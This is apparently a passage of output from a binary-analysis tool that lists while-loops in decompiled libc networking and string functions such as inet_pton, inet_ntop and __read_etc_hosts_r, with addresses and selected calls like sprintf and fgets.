		while (true) {
		while (true) {
		while (true) {
		while (true) {
		free();
		free();
		while (true) {
=============================WHILE LOOPS ID : 184 @ __GI_strncat ====================================
++++++++ WHILE START : 69056 
++++++++ WHILE FUNCTION : __GI_strncat 
++++++++ WHILE END : 69105 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 190 @ inet_pton ====================================
++++++++ WHILE START : 70195 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 70440 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		if (inet_pton4(v203, v201) > 0) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 193 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 71032 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 71179 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_ntop4(a2 + 12, v236, v237 - v236 + 86) == 0) {
		v234 = sprintf(v236, (int32_t)"%x", v233, v197, v229, v230, v197, (int32_t)&v235);
		if (inet_ntop4(a2 + 12, v236, v237 - v236 + 86) == 0) {
		v234 = sprintf(v231, (int32_t)"%x", v233, v197, v229, v230, v197, (int32_t)&v235);
=============================WHILE LOOPS ID : 196 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72820 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 72833 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v198, v200, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 197 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72875 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 72888 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v198, v200, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 198 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 72924 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 73156 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v198, v200, a1) != 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (__GI_strcasecmp(a2, v234) == 0) {
		if (inet_pton(2, (char *)v236, v199) > 0) {
		__GI_fclose((int16_t *)a1);
		if (inet_pton(10, (char *)v237, v197) > 0) {
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 199 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 73207 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 73220 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v198, v200, a1) != 0) {
		__GI_fclose((int16_t *)a1);
